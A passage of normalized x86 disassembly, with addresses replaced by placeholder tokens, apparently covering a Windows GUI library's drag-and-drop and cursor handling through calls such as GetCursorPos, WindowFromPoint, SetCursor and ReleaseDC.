je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x140 ]
call sub_43c504
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_432880
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_42a240
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x8b ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42a0b4
mov [ ebp - 0xc ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push [ eax ]
mov eax [ rw-data ]
pop edx
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push [ eax + 0x4 ]
mov eax [ rw-data ]
pop edx
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ ebp - 0x11 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ ebp - 0x11 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_436450
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x10 ] ecx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_42a120
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
mov al 0x2
call sub_42a120
mov edx eax
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov [ ebp - 0x6 ] ax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_42c3e4
mov eax [ rw-data ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x10 ] ecx
xor eax eax
call sub_42a120
cmp [ rw-data ] 0x0
je r-xdata
movsx edx [ ebp - 0x6 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422d64
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov dx [ ebp - 0x6 ]
mov eax [ rw-data ]
call sub_436414
mov eax [ rw-data ]
cmp [ eax + 0x62 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x41 ] 0x20
je r-xdata
push ebp
call sub_42a170
pop ecx
mov edx [ rw-data ]
mov [ edx + 0x58 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov edx [ rw-data ]
mov bx 0xffe9
call sub_44c24c
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax [ rw-data ]
call sub_436574
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov eax [ rw-data ]
call sub_436450
jmp r-xdata
mov eax [ rw-data ]
call sub_436608
movsx edx [ ebp - 0x6 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422d64
push eax
call SetCursor
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
call sub_42c3e4
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
mov bx 0xffdd
call sub_44c24c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov bx 0xffdd
call sub_44c24c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
lea edx [ eax + 0x5c ]
mov eax [ rw-data ]
add eax 0x44
mov ecx 0x10
call sub_4461ec
test al al
jne r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ edx + 0x5c ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_42a570
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4294dc
mov [ rw-data ] eax
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x44
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
test eax eax
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fdivp st1
mov eax [ ebp - 0x4 ]
fstp [ eax + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_436450
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x10 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fdivp st1
mov eax [ ebp - 0x4 ]
fstp [ eax + 0x28 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x10 ]
sub eax [ edx + 0x4 ]
test eax eax
jle r-xdata
mov esp ebp
pop ebp
retn
mov eax rw-data
call sub_42a240
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub_42a718
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_42a8e2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ rw-data ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8b ] 0x0
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffe5
call sub_44c24c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffe1
call sub_44c24c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x38 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429894
mov [ ebp - 0x10 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x10 ]
call sub_42a570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4296f0
mov [ ebp - 0x10 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x44
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x38 ]
call sub_434714
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_43b77c
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x38 ]
call sub_42c3a8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x48 ] edx
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x38 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
lea esi [ eax + 0x44 ]
lea edi [ edx + 0x5c ]
mov ecx 0x4
[ edi ] [ esi ]
lea eax [ ebp - 0x18 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x48 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x38 ]
add edx [ eax + 0x3c ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x44 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0x38 ]
add eax [ ecx + 0x38 ]
lea ecx [ ebp - 0x20 ]
call sub_43b77c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x50 ] edx
sub_42a900
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne [ ebp - 0x1 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x90 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov ecx [ rw-data ]
mov bx 0xffc2
call sub_44c24c
mov [ ebp - 0x1 ] al
sub_42a980
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x1 ] al
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xd ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor eax eax
push ebp
push sub_42abfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42abce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_429554
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_44c200
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x0
sete al
mov edx [ ebp - 0xc ]
mov [ edx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov [ ebp - 0xd ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_42a900
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov al 0x1
call sub_42a120
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_436608
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42abd5
mov eax [ rw-data ]
call sub_44c070
xor eax eax
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x14 ]
push eax
mov al [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx ]
xor eax eax
mov [ rw-data ] eax
retn
mov [ ebp - 0xe ] 0x3
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x38 ]
call sub_41a7a4
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add eax 0xc
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov dl [ ebp - 0xe ]
call sub_429fd4
mov [ ebp - 0xe ] 0x4
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_42df28
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0xc ]
cmp eax [ edx + 0x38 ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41f528
sub_42abd5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x8 ]
call sub_44c070
sub_42ac20
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
call sub_428e90
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
call GetParent
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub_42ac70
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42ac20
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
push 0x0
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_42c3e4
lea edx [ ebp - 0x1c ]
mov cl [ ebp - 0x5 ]
mov eax [ ebp - 0x10 ]
call sub_43130c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
sub_42accc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_43c264
pop ecx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
sub_42ad04
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_43c728
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax ] edx
sub_42ad40
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetWindowOrgEx
push 0x0
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SetWindowOrgEx
mov esp ebp
pop ebp
retn
sub_42ad7c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42ae2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_43ca60
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_42ae05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_42afcc
call sub_44c848
call sub_44c848
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43c464
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_40fa58
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_42ae38
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42aed6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aedd
mov eax [ rw-data ]
call sub_43ca60
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42aeae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_42afcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40fab8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_40fa58
test al al
je r-xdata
sub_42aee4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42afcc
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40f61c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_42af20
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fce4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_40fcf0
mov eax [ ebp - 0x4 ]
call sub_42b040
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42afab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x4
jl r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43c264
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_43ca60
retn
call sub_42ad7c
sub_42afcc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40fcf0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_43ca0c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
push eax
call ReleaseDC
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
sub_42b014
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42afcc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x58 ] eax
sub_42b040
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42d26c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffffff7f
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x80
jmp r-xdata
sub_42b078
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42b0c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ce10
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov bx 0xfffd
call sub_44c24c
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b138
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
sub eax 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
je r-xdata
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
